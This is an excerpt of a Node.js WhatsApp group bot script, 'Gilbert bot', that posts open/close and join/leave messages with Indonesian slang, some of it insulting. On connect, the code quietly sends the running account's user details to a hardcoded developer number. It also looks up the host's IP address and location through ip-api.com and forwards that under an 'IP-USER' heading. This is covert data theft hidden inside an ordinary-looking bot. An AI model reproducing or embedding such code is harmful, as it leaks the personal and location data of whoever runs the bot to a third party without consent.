...
prefix = '#'
shp = '⬡'
owner = "6281235136510@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`6281235136510@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, GILBERT");
console.log(color(figlet.textSync(`${spc1}            Gilbert bot`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: FOLLOW IG GUA NGAB:gilbert_ajah_hehe', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6281235136510'))
    console.log(color('[GILBERT BOT]'), color('GILBERT BOT IS ONLINE㋛︎', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
    console.log(color('⎇','green'), color('MASIH NUB BRO HEHE', 'white'))
  });
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`6281235136510@s.whatsapp.net`, `*Hi Owner Gilbert, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Gilbert bot.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6281235136510?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6281235136510@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Gilbert Bot .",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6281235136510?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'Gilbert',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Gilbert;;;\nFN:resku\nitem1.TEL;waid=6281235136510:+62 812-3513-6510\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await client.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Group Opened ] \n\n_Group has been opened by admin_\n_Now all members can send messages_,ANJIR GROUP NYA DIBUKA (˵ ͡° ͜ʖ ͡°˵)`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Opened ] - In ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Group Closed ] \n\n_Group has been closed by admin_\n_Now only admin can send messages_,YAHHH DI TUTUP`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "NGAPAIN UNDANG GW?,LU SIAPA GW??SOKAB ASU", "conversation");
      }
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'PERGI LU'},type:1}, {buttonId:`sc`,buttonText:{displayText:'SCRIPT LUR??'}, type:1}]
